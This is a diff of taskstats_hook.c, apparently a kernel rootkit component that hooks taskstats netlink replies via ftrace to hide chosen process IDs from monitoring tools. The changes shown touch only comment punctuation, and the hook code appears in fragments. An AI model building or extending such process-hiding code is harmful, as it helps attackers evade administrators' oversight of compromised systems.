@@ -1,4 +1,4 @@
-/* taskstats_hook.c — Filter taskstats NETLINK_GENERIC responses for hidden PIDs.
+/* taskstats_hook.c   Filter taskstats NETLINK_GENERIC responses for hidden PIDs.
  *
  * taskstats allows reading per-process CPU/memory accounting via netlink even
  * when /proc is hidden. Without this module, `getconf` / `cgacct` / monitoring
@@ -32,7 +32,7 @@ static taskstats_cmd_fn_t orig_taskstats_cmd = NULL;
 static struct ftrace_hook taskstats_hook_entry;
 static bool taskstats_hook_installed = false;
 
-/* ── PID extraction from TASKSTATS_CMD_GET nlh ───────────────────── */
+/*  PID extraction from TASKSTATS_CMD_GET nlh                     */
 
 static notrace pid_t extract_taskstats_pid(struct nlmsghdr *nlh)
 {
@@ -61,7 +61,7 @@ static notrace pid_t extract_taskstats_pid(struct nlmsghdr *nlh)
     return (pid_t)pid;
 }
 
-/* ── Hook function ───────────────────────────────────────────────── */
+/*  Hook function                                                 */
 
 static notrace int hook_taskstats_cmd(struct sk_buff *skb,
                                        struct nlmsghdr *nlh,
@@ -79,7 +79,7 @@ static notrace int hook_taskstats_cmd(struct sk_buff *skb,
     return orig_taskstats_cmd(skb, nlh, extack);
 }
 
-/* ── Init / Exit ─────────────────────────────────────────────────── */
+/*  Init / Exit                                                   */
 
 static const char *taskstats_candidates[] = {
     "taskstats_reply_cmd",
@@ -110,7 +110,7 @@ int taskstats_hook_init(void)
         orig_taskstats_cmd = NULL;
     }
 
-    /* Graceful no-op — taskstats not a common vector */
+    /* Graceful no-op   taskstats not a common vector */
     return 0;
 }
 
